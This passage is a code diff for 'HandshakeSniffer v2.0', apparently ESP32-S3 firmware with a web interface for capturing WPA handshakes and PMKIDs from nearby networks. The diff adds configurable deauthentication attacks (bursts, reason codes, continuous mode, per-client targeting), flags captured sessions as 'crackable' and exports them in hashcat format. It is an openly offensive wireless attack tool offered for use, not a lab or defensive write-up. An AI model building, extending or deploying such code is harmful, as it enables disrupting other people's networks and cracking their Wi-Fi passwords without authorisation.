+    bool crackable = (s.m1 && s.m2 && s.mic_valid) || s.pmkid;
+
+    char buf[256];
+    snprintf(buf, sizeof(buf),
+      "{\"ap\":\"%s\",\"cli\":\"%s\","
+      "\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
+      "\"pmkid\":%s,\"pmkid_hex\":\"%s\","
+      "\"mic_valid\":%s,\"crackable\":%s,"
+      "\"first_seen\":%u,\"last_seen\":%u}",
+      ap, cli,
+      s.m1?"true":"false", s.m2?"true":"false",
+      s.m3?"true":"false", s.m4?"true":"false",
+      s.pmkid?"true":"false", pmkidHex,
+      s.mic_valid?"true":"false", crackable?"true":"false",
+      (unsigned)s.first_seen, (unsigned)s.last_seen);
+    out += buf;
   }
 
-  char json[512];
-  snprintf(json, sizeof(json),
-    "{"
-    "\"ssid\":\"%s\","
-    "\"ap_mac\":\"%s\","
-    "\"cli_mac\":\"%s\","
-    "\"channel\":%d,"
-    "\"cap_bytes\":%u,"
-    "\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
-    "\"pmkid\":%s,"
-    "\"pmkid_hex\":\"%s\","
-    "\"crackable\":%s"
-    "}",
-    ssidEsc, ap, cli, g_targetChannel, (unsigned)capBytes,
-    hs.m1?"true":"false", hs.m2?"true":"false",
-    hs.m3?"true":"false", hs.m4?"true":"false",
-    hs.pmkid?"true":"false", pmkidHex,
-    ((hs.m1&&hs.m2)||hs.pmkid)?"true":"false");
+  out += "]}";
+  return out;
+}
 
-  return String(json);
+// ─── SPARKLINE JSON ───────────────────────────────────────────────────────────
+String buildSparkJSON() {
+  String out = "[";
+  if (g_sparkMutex && xSemaphoreTake(g_sparkMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+    for (int i = 0; i < SPARK_LEN; i++) {
+      int idx = (g_sparkHead + i) % SPARK_LEN;
+      if (i) out += ",";
+      out += g_sparkline[idx];
+    }
+    xSemaphoreGive(g_sparkMutex);
+  }
+  out += "]";
+  return out;
+}
+
+// ─── CLIENTS JSON ─────────────────────────────────────────────────────────────
+String buildClientsJSON() {
+  String out = "[";
+  if (g_cliMutex && xSemaphoreTake(g_cliMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
+    bool first = true;
+    uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
+    for (int i = 0; i < MAX_CLIENTS; i++) {
+      if (!g_clients[i].active) continue;
+      // Expire clients not seen in 30s
+      if (now - g_clients[i].last_seen > 30000) { g_clients[i].active = false; continue; }
+      if (!first) out += ",";
+      first = false;
+      char m[18]; mac2str(g_clients[i].mac, m);
+      char buf[96];
+      snprintf(buf, sizeof(buf),
+        "{\"mac\":\"%s\",\"rssi\":%d,\"frames\":%u,\"age\":%u}",
+        m, (int)g_clients[i].rssi, (unsigned)g_clients[i].frame_count,
+        (unsigned)((now - g_clients[i].last_seen) / 1000));
+      out += buf;
+    }
+    xSemaphoreGive(g_cliMutex);
+  }
+  out += "]";
+  return out;
 }
 
 // ─── WEB UI HTML ─────────────────────────────────────────────────────────────
@@ -871,86 +1245,102 @@ static const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>HandshakeSniffer v1.3</title>
+<title>HandshakeSniffer v2.0</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;-webkit-text-size-adjust:100%}
-header{background:#161b22;border-bottom:1px solid #30363d;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
-header h1{font-size:1.1rem;font-weight:600;color:#58a6ff;white-space:nowrap}
-header .sub{font-size:0.72rem;color:#8b949e;margin-top:2px}
-.badge{background:#388bfd22;color:#58a6ff;border:1px solid #388bfd55;border-radius:12px;padding:3px 12px;font-size:0.72rem;white-space:nowrap;flex-shrink:0}
-main{max-width:1000px;margin:0 auto;padding:14px 10px}
-.card{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:14px;overflow:hidden}
-.card-head{padding:10px 14px;background:#1c2128;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap}
-.card-head h2{font-size:0.92rem;font-weight:600;color:#c9d1d9}
+:root{
+  --bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--bg4:#21262d;
+  --border:#30363d;--border2:#21262d;
+  --text:#e6edf3;--text2:#c9d1d9;--muted:#8b949e;
+  --blue:#58a6ff;--green:#3fb950;--red:#f85149;--yellow:#d29922;
+  --blue-bg:#388bfd22;--blue-border:#388bfd55;
+}
+body.light{
+  --bg:#f6f8fa;--bg2:#ffffff;--bg3:#f0f2f5;--bg4:#e6eaef;
+  --border:#d0d7de;--border2:#d0d7de;
+  --text:#24292f;--text2:#24292f;--muted:#57606a;
+  --blue:#0969da;--green:#2da44e;--red:#cf222e;--yellow:#9a6700;
+  --blue-bg:#ddf4ff;--blue-border:#54aeff88;
+}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;-webkit-text-size-adjust:100%;transition:background .2s,color .2s}
+header{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
+header h1{font-size:1.1rem;font-weight:600;color:var(--blue);white-space:nowrap}
+header .sub{font-size:0.72rem;color:var(--muted);margin-top:2px}
+.hdr-right{display:flex;gap:8px;align-items:center;flex-shrink:0;flex-wrap:wrap}
+.badge{background:var(--blue-bg);color:var(--blue);border:1px solid var(--blue-border);border-radius:12px;padding:3px 12px;font-size:0.72rem;white-space:nowrap}
+.heap-chip{background:var(--bg4);color:var(--muted);border:1px solid var(--border);border-radius:12px;padding:3px 10px;font-size:0.7rem;white-space:nowrap;font-family:monospace}
+.theme-btn{background:none;border:1px solid var(--border);color:var(--muted);border-radius:8px;padding:4px 9px;font-size:0.8rem;cursor:pointer;min-height:28px}
+main{max-width:1060px;margin:0 auto;padding:14px 10px}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:14px;overflow:hidden}
+.card-head{padding:10px 14px;background:var(--bg3);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap}
+.card-head h2{font-size:0.92rem;font-weight:600;color:var(--text2)}
 .card-body{padding:12px 14px}
-/* ── BUTTONS — min 44px tall on mobile for touch targets ── */
 button{border:none;border-radius:6px;padding:8px 14px;font-size:0.82rem;cursor:pointer;font-weight:500;transition:opacity .15s;min-height:36px;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
-button:hover{opacity:.85}
-button:active{opacity:.7}
-button:disabled{opacity:.4;cursor:default}
+button:hover{opacity:.85}button:active{opacity:.7}button:disabled{opacity:.4;cursor:default}
 .btn-primary{background:#238636;color:#fff}
 .btn-danger{background:#da3633;color:#fff}
 .btn-warn{background:#9e6a03;color:#fff}
 .btn-sel{background:#0d419d;color:#fff;padding:5px 11px;font-size:0.75rem;min-height:32px}
 .btn-dl{background:#1f6feb;color:#fff}
-.btn-sm{padding:5px 11px;font-size:0.75rem;min-height:32px}
+.btn-sm{padding:5px 11px;font-size:0.75rem;min-height:32px;background:var(--bg4);color:var(--text2);border:1px solid var(--border)}
+.btn-deauth-cli{background:#9e6a03;color:#fff;padding:4px 9px;font-size:0.72rem;min-height:28px}
 .row{display:flex;gap:7px;flex-wrap:wrap;align-items:center}
-/* ── SCAN TABLE — horizontal scroll on mobile ── */
-.tbl-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;overflow-y:hidden;max-height:340px;overflow-y:auto}
+.tbl-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;max-height:340px;overflow-y:auto}
 .tbl-scroll::-webkit-scrollbar{height:4px;width:4px}
-.tbl-scroll::-webkit-scrollbar-track{background:#0d1117}
-.tbl-scroll::-webkit-scrollbar-thumb{background:#30363d;border-radius:2px}
+.tbl-scroll::-webkit-scrollbar-track{background:var(--bg)}
+.tbl-scroll::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
 table{width:100%;min-width:520px;border-collapse:collapse;font-size:0.82rem}
 thead{position:sticky;top:0;z-index:1}
-th{background:#0d1117;color:#8b949e;font-weight:500;text-align:left;padding:8px 10px;border-bottom:1px solid #30363d;white-space:nowrap}
-td{padding:7px 10px;border-bottom:1px solid #21262d;vertical-align:middle;white-space:nowrap}
+th{background:var(--bg);color:var(--muted);font-weight:500;text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);white-space:nowrap}
+td{padding:7px 10px;border-bottom:1px solid var(--border2);vertical-align:middle;white-space:nowrap}
 tr:last-child td{border-bottom:none}
-tr:hover td{background:#1c2128}
-/* SSID col can wrap */
+tr:hover td{background:var(--bg3)}
 td:nth-child(2){white-space:normal;word-break:break-all;min-width:80px}
-.status-box{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px 12px;font-size:0.82rem}
-.s-row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:4px}
+.status-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px 12px;font-size:0.82rem}
+.s-row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:6px}
 .s-kv{display:flex;flex-direction:column;min-width:72px}
-.s-k{font-size:0.68rem;color:#8b949e;margin-bottom:2px;white-space:nowrap}
+.s-k{font-size:0.68rem;color:var(--muted);margin-bottom:2px;white-space:nowrap}
 .s-v{font-size:0.88rem;font-weight:600}
-.ok{color:#3fb950}.warn{color:#d29922}.bad{color:#f85149}.na{color:#8b949e}
-.log-box{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:8px 10px;
-  height:130px;overflow-y:auto;font-family:monospace;font-size:0.76rem;color:#8b949e;
+.ok{color:var(--green)}.warn{color:var(--yellow)}.bad{color:var(--red)}.na{color:var(--muted)}
+.log-box{background:var(--bg);border:1px solid var(--border2);border-radius:6px;padding:8px 10px;
+  height:130px;overflow-y:auto;font-family:monospace;font-size:0.76rem;color:var(--muted);
   -webkit-overflow-scrolling:touch}
 .log-box p{padding:1px 0;border-bottom:1px solid #21262d22;word-break:break-all}
 .log-box p:last-child{border:none}
-.ts{color:#388bfd;margin-right:6px}
-.target-info{background:#1c2128;border:1px solid #30363d;border-radius:6px;padding:8px 12px;font-size:0.82rem;color:#c9d1d9;word-break:break-all}
+.ts{color:var(--blue);margin-right:6px}
+.target-info{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px 12px;font-size:0.82rem;color:var(--text2);word-break:break-all}
 .mono{font-family:monospace;font-size:0.76rem}
-.chip{display:inline-block;border-radius:10px;padding:1px 8px;font-size:0.72rem;font-weight:600;margin-left:6px}
+.chip{display:inline-block;border-radius:10px;padding:1px 8px;font-size:0.72rem;font-weight:600;margin-left:3px}
 .chip-yes{background:#238636;color:#fff}
-.chip-no{background:#21262d;color:#8b949e}
-select{background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:4px 6px;font-size:0.78rem;min-height:32px;touch-action:manipulation}
-input[type=checkbox]{width:16px;height:16px;cursor:pointer;accent-color:#58a6ff}
-/* ── MOBILE tweaks ── */
-@media(max-width:600px){
-  main{padding:10px 8px}
-  .card-body{padding:10px 10px}
-  .s-row{gap:8px}
-  .s-kv{min-width:58px}
-  .row{gap:6px}
-  button{font-size:0.78rem}
-  header h1{font-size:1rem}
-}
-@media(max-width:380px){
-  table{font-size:0.76rem}
-  th,td{padding:6px 7px}
-}
+.chip-no{background:var(--bg4);color:var(--muted)}
+.chip-pmkid{background:#6e40c9;color:#fff}
+.chip-crack{background:#da3633;color:#fff}
+select{background:var(--bg);color:var(--text2);border:1px solid var(--border);border-radius:4px;padding:4px 6px;font-size:0.78rem;min-height:32px;touch-action:manipulation}
+input[type=checkbox]{width:16px;height:16px;cursor:pointer;accent-color:var(--blue)}
+.spark-wrap{padding:8px 14px 4px;border-top:1px solid var(--border)}
+canvas{display:block;border-radius:4px}
+.sess-table{width:100%;border-collapse:collapse;font-size:0.8rem}
+.sess-table th{background:var(--bg);color:var(--muted);font-weight:500;text-align:left;padding:6px 8px;border-bottom:1px solid var(--border);white-space:nowrap}
+.sess-table td{padding:6px 8px;border-bottom:1px solid var(--border2);vertical-align:middle;white-space:nowrap}
+.sess-table tr:last-child td{border-bottom:none}
+.cli-table{width:100%;border-collapse:collapse;font-size:0.8rem}
+.cli-table th{background:var(--bg);color:var(--muted);font-weight:500;text-align:left;padding:6px 8px;border-bottom:1px solid var(--border)}
+.cli-table td{padding:6px 8px;border-bottom:1px solid var(--border2);vertical-align:middle}
+@media(max-width:600px){main{padding:10px 8px}.card-body{padding:10px 10px}.s-row{gap:8px}.s-kv{min-width:58px}.row{gap:6px}button{font-size:0.78rem}header h1{font-size:1rem}}
+@media(max-width:380px){table{font-size:0.76rem}th,td{padding:6px 7px}}
 </style>
 </head>
 <body>
 <header>
   <div>
-    <h1>🦈 HandshakeSniffer v1.3</h1>
-    <div class="sub">ESP32-S3 · WPA/WPA2/WPA3 EAPOL + PMKID · Passive capture</div>
+    <h1>🦈 HandshakeSniffer v2.0</h1>
+    <div class="sub">ESP32-S3 · WPA/WPA2/WPA3 · Multi-client · EAPOL+PMKID</div>
   </div>
-  <span class="badge" id="capBadge">IDLE</span>
+  <div class="hdr-right">
+    <span class="heap-chip" id="heapChip">heap …</span>
+    <span class="badge" id="capBadge">IDLE</span>
+    <button class="theme-btn" onclick="toggleTheme()" title="Toggle dark/light">🌙</button>
+  </div>
 </header>
 <main>
 
@@ -958,79 +1348,137 @@ input[type=checkbox]{width:16px;height:16px;cursor:pointer;accent-color:#58a6ff}
 <div class="card">
   <div class="card-head">
     <h2>Target &amp; Capture</h2>
-    <button class="btn-primary btn-sm" onclick="triggerScan()">Scan APs</button>
+    <button class="btn-primary btn-sm" onclick="triggerScan()">🔍 Scan APs</button>
   </div>
   <div class="card-body">
     <div class="target-info" id="targetBox">
-      <span style="color:#8b949e">No target selected — scan APs below and click Select</span>
+      <span style="color:var(--muted)">No target — scan below and click Select</span>
     </div>
     <div class="row" style="margin-top:10px">
       <button class="btn-primary" id="btnStart"  onclick="startCapture()" disabled>▶ Start</button>
       <button class="btn-danger"  id="btnStop"   onclick="stopCapture()"  disabled>■ Stop</button>
       <button class="btn-warn"    id="btnDeauth" onclick="sendDeauth()"   disabled>⚡ Deauth</button>
-      <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="clearBuf()">🗑 Clear</button>
-      <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="resetHs()">↺ Reset HS</button>
-      <label style="font-size:0.78rem;color:#8b949e;display:flex;align-items:center;gap:4px">Bursts:
+      <button class="btn-sm" onclick="clearBuf()">🗑 Clear</button>
+      <button class="btn-sm" onclick="resetSessions()">↺ Reset Sessions</button>
+    </div>
+    <div class="row" style="margin-top:8px;gap:12px;flex-wrap:wrap">
+      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px">Bursts:
         <select id="burstSel">
-          <option value="3">3</option>
-          <option value="5" selected>5</option>
-          <option value="10">10</option>
-          <option value="20">20</option>
-          <option value="30">30</option>
-          <option value="50">50</option>
+          <option value="3">3</option><option value="5" selected>5</option>
+          <option value="10">10</option><option value="20">20</option>
+          <option value="30">30</option><option value="50">50</option>
         </select>
       </label>
-      <label style="display:flex;align-items:center;gap:5px;font-size:0.78rem;color:#8b949e;cursor:pointer">
+      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px">Reason:
+        <select id="reasonSel">
+          <option value="7" selected>7 (Class3)</option>
+          <option value="1">1 (Unspecified)</option>
+          <option value="3">3 (Leaving)</option>
+          <option value="8">8 (Disassoc)</option>
+          <option value="15">15 (4-Way TO)</option>
+        </select>
+      </label>
+      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px">Gap:
+        <select id="gapSel">
+          <option value="0">50µs</option>
+          <option value="1" selected>100µs</option>
+          <option value="2">200µs</option>
+        </select>
+      </label>
+      <label style="display:flex;align-items:center;gap:5px;font-size:0.78rem;color:var(--muted);cursor:pointer">
         <input type="checkbox" id="filterChk" checked> Filter BSSID
+      </label>
+      <label style="display:flex;align-items:center;gap:5px;font-size:0.78rem;color:var(--muted);cursor:pointer">
+        <input type="checkbox" id="contChk"> Continuous
+      </label>
+      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px" id="contIntervalLabel" style="display:none">Interval:
+        <select id="contInterval">
+          <option value="3000">3s</option>
+          <option value="5000" selected>5s</option>
+          <option value="10000">10s</option>
+          <option value="20000">20s</option>
+          <option value="30000">30s</option>
+        </select>
       </label>
     </div>
   </div>
+  <!-- Sparkline graph -->
+  <div class="spark-wrap">
+    <div style="font-size:0.68rem;color:var(--muted);margin-bottom:4px">Capture activity (2s intervals, last 2min)</div>
+    <canvas id="sparkCanvas" height="48" style="width:100%;background:var(--bg);border-radius:4px"></canvas>
+  </div>
 </div>
 
-<!-- HANDSHAKE STATUS -->
+<!-- SESSION TABLE -->
 <div class="card">
-  <div class="card-head"><h2>Handshake Status</h2></div>
+  <div class="card-head">
+    <h2>Handshake Sessions</h2>
+    <span id="sessCount" style="font-size:0.75rem;color:var(--muted)"></span>
+  </div>
+  <div class="tbl-scroll">
+    <table class="sess-table">
+      <thead>
+        <tr>
+          <th>AP MAC</th><th>Client MAC</th>
+          <th>M1</th><th>M2</th><th>M3</th><th>M4</th>
+          <th>PMKID</th><th>MIC</th><th>Crackable</th>
+          <th>Seen</th><th>Export</th>
+        </tr>
+      </thead>
+      <tbody id="sessBody">
+        <tr><td colspan="11" style="text-align:center;color:var(--muted);padding:18px">
+          Start capture to see sessions
+        </td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- CONNECTED CLIENTS -->
+<div class="card">
+  <div class="card-head">
+    <h2>Connected Clients</h2>
+    <span id="cliCount" style="font-size:0.75rem;color:var(--muted)"></span>
+  </div>
+  <div class="tbl-scroll">
+    <table class="cli-table">
+      <thead>
+        <tr><th>Client MAC</th><th>RSSI</th><th>Frames</th><th>Last Seen</th><th>Deauth</th></tr>
+      </thead>
+      <tbody id="cliBody">
+        <tr><td colspan="5" style="text-align:center;color:var(--muted);padding:14px">
+          Clients appear once capture is active and target selected
+        </td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- EXPORTS -->
+<div class="card">
+  <div class="card-head"><h2>Downloads</h2></div>
   <div class="card-body">
-    <div class="status-box">
-      <div class="s-row">
-        <div class="s-kv"><div class="s-k">M1 (ANonce)</div><div class="s-v" id="sM1">—</div></div>
-        <div class="s-kv"><div class="s-k">M2 (SNonce+MIC)</div><div class="s-v" id="sM2">—</div></div>
-        <div class="s-kv"><div class="s-k">M3</div><div class="s-v" id="sM3">—</div></div>
-        <div class="s-kv"><div class="s-k">M4</div><div class="s-v" id="sM4">—</div></div>
-        <div class="s-kv"><div class="s-k">PMKID</div><div class="s-v" id="sPmkid">—</div></div>
-        <div class="s-kv"><div class="s-k">Crackable</div><div class="s-v" id="sCrack">—</div></div>
-        <div class="s-kv"><div class="s-k">Cap Bytes</div><div class="s-v" id="sBytes">—</div></div>
-      </div>
-    </div>
-    <div class="row" style="margin-top:10px">
+    <div class="row">
       <button class="btn-dl" onclick="download('/dl_pcap','handshake.pcap')">⬇ PCAP</button>
-      <button class="btn-dl" onclick="download('/dl_22000','handshake.22000')">⬇ 22000</button>
+      <button class="btn-dl" onclick="download('/dl_22000','handshake.22000')">⬇ 22000 (hashcat)</button>
       <button class="btn-dl" onclick="download('/dl_json','capture.json')">⬇ JSON</button>
     </div>
   </div>
 </div>
 
-<!-- SCAN RESULTS — horizontally slidable, vertically scrollable -->
+<!-- SCAN RESULTS -->
 <div class="card">
   <div class="card-head">
     <h2>Nearby Networks</h2>
-    <span id="scanStatus" style="font-size:0.75rem;color:#8b949e"></span>
+    <span id="scanStatus" style="font-size:0.75rem;color:var(--muted)"></span>
   </div>
   <div class="tbl-scroll">
     <table>
       <thead>
-        <tr>
-          <th>#</th>
-          <th>SSID</th>
-          <th>BSSID</th>
-          <th>CH</th>
-          <th>RSSI</th>
-          <th>ENC</th>
-          <th>Action</th>
-        </tr>
+        <tr><th>#</th><th>SSID</th><th>BSSID</th><th>CH</th><th>Signal</th><th>ENC</th><th>Action</th></tr>
       </thead>
       <tbody id="scanBody">
-        <tr><td colspan="7" style="text-align:center;color:#8b949e;padding:22px;white-space:normal">
+        <tr><td colspan="7" style="text-align:center;color:var(--muted);padding:22px;white-space:normal">
           Tap <b>Scan APs</b> to discover nearby networks
         </td></tr>
       </tbody>
@@ -1042,7 +1490,7 @@ input[type=checkbox]{width:16px;height:16px;cursor:pointer;accent-color:#58a6ff}
 <div class="card">
   <div class="card-head">
     <h2>Event Log</h2>
-    <button class="btn-sm" style="background:#21262d;color:#c9d1d9" onclick="clearLog()">Clear</button>
+    <button class="btn-sm" onclick="clearLog()">Clear</button>
   </div>
   <div class="card-body" style="padding:8px 10px">
     <div class="log-box" id="logBox"></div>
@@ -1051,219 +1499,341 @@ input[type=checkbox]{width:16px;height:16px;cursor:pointer;accent-color:#58a6ff}
 
 </main>
 <script>
+'use strict';
 let selBSSID='', selCH=0, selSSID='', capturing=false;
+let deauthClientMAC='';
 
+// ── Theme ──────────────────────────────────────────────────────────────────
+function toggleTheme(){
+  document.body.classList.toggle('light');
+  try{localStorage.setItem('theme', document.body.classList.contains('light')?'light':'dark');}catch(e){}
+  drawSpark(lastSpark);
+}
+try{if(localStorage.getItem('theme')==='light')document.body.classList.add('light');}catch(e){}
+
+// ── Target select ──────────────────────────────────────────────────────────
 function selectTarget(bssid, ch, ssid) {
   selBSSID=bssid; selCH=ch; selSSID=ssid||'';
+  deauthClientMAC='';
   document.getElementById('targetBox').innerHTML =
-    '<b>' + (ssid||'[Hidden]') + '</b>'
-    + ' &nbsp;<span class="mono" style="color:#8b949e">' + bssid + '</span>'
-    + ' &nbsp;CH&nbsp;<b>' + ch + '</b>';
-  document.getElementById('btnStart').disabled  = false;
-  document.getElementById('btnDeauth').disabled = false;
+    '<b>'+(ssid||'[Hidden]')+'</b>'
+    +' &nbsp;<span class="mono" style="color:var(--muted)">'+bssid+'</span>'
+    +' &nbsp;CH&nbsp;<b>'+ch+'</b>';
+  document.getElementById('btnStart').disabled=false;
+  document.getElementById('btnDeauth').disabled=false;
 }
 
+// ── Scan ───────────────────────────────────────────────────────────────────
 function triggerScan() {
-  document.getElementById('scanStatus').textContent = 'Scanning\u2026';
-  document.getElementById('scanBody').innerHTML =
-    '<tr><td colspan="7" style="text-align:center;color:#8b949e;padding:18px;white-space:normal">Scanning\u2026</td></tr>';
+  document.getElementById('scanStatus').textContent='Scanning\u2026';
+  document.getElementById('scanBody').innerHTML=
+    '<tr><td colspan="7" style="text-align:center;color:var(--muted);padding:18px">Scanning\u2026</td></tr>';
   fetch('/scan_trigger').then(()=>pollScan()).catch(()=>pollScan());
 }
-
 function pollScan() {
   fetch('/scan').then(r=>r.text()).then(html=>{
     if(html==='SCANNING'){setTimeout(pollScan,1200);return;}
-    document.getElementById('scanBody').innerHTML = html;
-    document.getElementById('scanStatus').textContent = '';
+    document.getElementById('scanBody').innerHTML=html;
+    document.getElementById('scanStatus').textContent='';
   }).catch(()=>setTimeout(pollScan,2000));
 }
 
+// ── Capture ────────────────────────────────────────────────────────────────
 function startCapture() {
   if(!selBSSID){alert('Select a target first');return;}
-  let filter = document.getElementById('filterChk').checked ? 1 : 0;
+  let filter=document.getElementById('filterChk').checked?1:0;
   fetch('/start_capture?bssid='+selBSSID+'&ch='+selCH+'&ssid='+encodeURIComponent(selSSID)+'&filter='+filter)
-    .then(r=>r.text()).then(()=>{
+    .then(()=>{
       capturing=true;
       document.getElementById('btnStart').disabled=true;
       document.getElementById('btnStop').disabled=false;
-      document.getElementById('capBadge').textContent='CAPTURING';
-      document.getElementById('capBadge').style.background='#da363322';
-      document.getElementById('capBadge').style.color='#f85149';
+      setBadge('CAPTURING','#da363322','#f85149');
     }).catch(()=>{});
 }
-
 function stopCapture() {
-  fetch('/stop_capture').then(r=>r.text()).then(()=>{
+  fetch('/stop_capture').then(()=>{
     capturing=false;
     document.getElementById('btnStart').disabled=false;
     document.getElementById('btnStop').disabled=true;
-    document.getElementById('capBadge').textContent='IDLE';
-    document.getElementById('capBadge').style.background='';
-    document.getElementById('capBadge').style.color='';
+    setBadge('IDLE','','');
   }).catch(()=>{});
 }
+function setBadge(txt, bg, col) {
+  let b=document.getElementById('capBadge');
+  b.textContent=txt; b.style.background=bg; b.style.color=col;
+}
 
-function sendDeauth() {
+// ── Deauth ─────────────────────────────────────────────────────────────────
+function sendDeauth(targetCli='') {
   if(!selBSSID){alert('Select a target first');return;}
-  let bursts = document.getElementById('burstSel').value;
+  let bursts=document.getElementById('burstSel').value;
+  let reason=document.getElementById('reasonSel').value;
+  let gap=document.getElementById('gapSel').value;
+  let cont=document.getElementById('contChk').checked?1:0;
+  let interval=document.getElementById('contInterval').value;
+  let cli=targetCli||deauthClientMAC||'';
   if(!capturing) startCapture();
   setTimeout(()=>{
-    fetch('/deauth?bssid='+selBSSID+'&ch='+selCH+'&bursts='+bursts)
-      .then(r=>r.text()).then(t=>console.log('deauth:',t)).catch(()=>{});
-  }, 600);
+    let url='/deauth?bssid='+selBSSID+'&ch='+selCH+'&bursts='+bursts
+            +'&reason='+reason+'&gap='+gap+'&cont='+cont+'&interval='+interval;
+    if(cli) url+='&cli='+encodeURIComponent(cli);
+    fetch(url).catch(()=>{});
+  },600);
+}
+function stopDeauth() { fetch('/stop_deauth').catch(()=>{}); }
+
+// ── Continuous toggle ──────────────────────────────────────────────────────
+document.getElementById('contChk').addEventListener('change',function(){
+  document.getElementById('contIntervalLabel').style.display=this.checked?'':'none';
+});
+
+// ── Clear / reset ──────────────────────────────────────────────────────────
+function clearLog(){document.getElementById('logBox').innerHTML='';logSeen.clear();}
+function clearBuf(){
+  fetch('/clear').then(()=>{logSeen.clear();document.getElementById('logBox').innerHTML='';refreshAll();}).catch(()=>{});
+}
+function resetSessions(){fetch('/reset_sessions').then(()=>refreshAll()).catch(()=>{});}
+
+// ── Download ───────────────────────────────────────────────────────────────
+function download(url, fn){let a=document.createElement('a');a.href=url;a.download=fn;document.body.appendChild(a);a.click();a.remove();}
+
+// ── Log dedup ──────────────────────────────────────────────────────────────
+const logSeen=new Set();
+function logSeenTrim(){
+  if(logSeen.size>200){
+    const arr=Array.from(logSeen);logSeen.clear();
+    arr.slice(arr.length-150).forEach(v=>logSeen.add(v));
+  }
 }
 
-function download(url, filename) {
-  let a=document.createElement('a');
-  a.href=url; a.download=filename; document.body.appendChild(a); a.click(); a.remove();
+// ── Sparkline ──────────────────────────────────────────────────────────────
+let lastSpark=[];
+function drawSpark(data){
+  lastSpark=data;
+  const cv=document.getElementById('sparkCanvas');
+  const pr=window.devicePixelRatio||1;
+  cv.width=cv.offsetWidth*pr; cv.height=48*pr;
+  const ctx=cv.getContext('2d');
+  const w=cv.width, h=cv.height;
+  const light=document.body.classList.contains('light');
+  ctx.fillStyle=light?'#f0f2f5':'#0d1117';
+  ctx.fillRect(0,0,w,h);
+  if(!data||data.length===0)return;
+  const max=Math.max(...data,1);
+  const bw=w/data.length;
+  const grad=ctx.createLinearGradient(0,0,0,h);
+  grad.addColorStop(0,'#58a6ff88');
+  grad.addColorStop(1,'#58a6ff11');
+  ctx.beginPath();
+  data.forEach((v,i)=>{
+    const x=i*bw;
+    const bh=Math.max(2,(v/max)*(h-4));
+    if(i===0)ctx.moveTo(x+bw/2,h-bh);
+    else ctx.lineTo(x+bw/2,h-bh);
+  });
+  ctx.strokeStyle='#58a6ff';ctx.lineWidth=1.5*pr;ctx.stroke();
+  ctx.lineTo(w,h);ctx.lineTo(0,h);ctx.closePath();
+  ctx.fillStyle=grad;ctx.fill();
 }
 
-function clearLog() {
-  document.getElementById('logBox').innerHTML='';
-  logSeen.clear();
+// ── Session table ──────────────────────────────────────────────────────────
+function renderSessions(sessions){
+  const tbody=document.getElementById('sessBody');
+  document.getElementById('sessCount').textContent=sessions.length+' session'+(sessions.length!==1?'s':'');
+  if(sessions.length===0){
+    tbody.innerHTML='<tr><td colspan="11" style="text-align:center;color:var(--muted);padding:18px">No sessions yet</td></tr>';
+    return;
+  }
+  let html='';
+  sessions.forEach(s=>{
+    const mk=v=>v?'<span class="chip chip-yes">✓</span>':'<span class="chip chip-no">—</span>';
+    const age=Math.round((Date.now()/1000)-(s.last_seen/1000));
+    html+='<tr>'
+      +'<td class="mono">'+s.ap+'</td>'
+      +'<td class="mono">'+s.cli+'</td>'
+      +[s.m1,s.m2,s.m3,s.m4].map(mk).join('')
+      +'<td>'+(s.pmkid?'<span class="chip chip-pmkid">PMKID</span>':'<span class="chip chip-no">—</span>')+'</td>'
+      +'<td>'+(s.mic_valid?'<span class="chip chip-yes">✓</span>':'<span class="chip chip-no">—</span>')+'</td>'
+      +'<td>'+(s.crackable?'<span class="chip chip-crack">YES</span>':'<span class="chip chip-no">No</span>')+'</td>'
+      +'<td style="color:var(--muted);font-size:0.75rem">'+age+'s ago</td>'
+      +'<td><button class="btn-sm" style="font-size:0.7rem;padding:3px 7px" onclick="download(\'/dl_22000\',\'hs_'+s.ap.replace(/:/g,'')+'.22000\')">22000</button></td>'
+      +'</tr>';
+  });
+  tbody.innerHTML=html;
 }
 
-function clearBuf() {
-  fetch('/clear').then(r=>r.text()).then(t=>{
-    logSeen.clear();
-    document.getElementById('logBox').innerHTML='';
-    refreshStatus();
-  }).catch(()=>{});
